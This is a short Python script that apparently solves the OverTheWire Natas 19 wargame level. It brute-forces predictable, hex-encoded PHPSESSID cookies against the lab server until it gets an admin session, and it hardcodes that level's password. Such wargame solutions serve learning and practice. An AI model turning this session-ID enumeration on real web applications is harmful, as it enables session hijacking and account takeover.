import requests
from requests.auth import HTTPBasicAuth
from requests_toolbelt.utils import dump
from binascii import hexlify
URL = "http://natas19.natas.labs.overthewire.org/index.php"
str1 = "-admin"


for i in range(1, 641):
    str2 = str(i) + str1
    str2 = hexlify(str2)
    COOKIES = {'PHPSESSID': str2}
    r = requests.get(url = URL, auth=HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), cookies = COOKIES)
    print(i)
    #Put the counter just to know that some progress is happening.
    if "You are an admin." in r.text:
        print(r.text)
        break
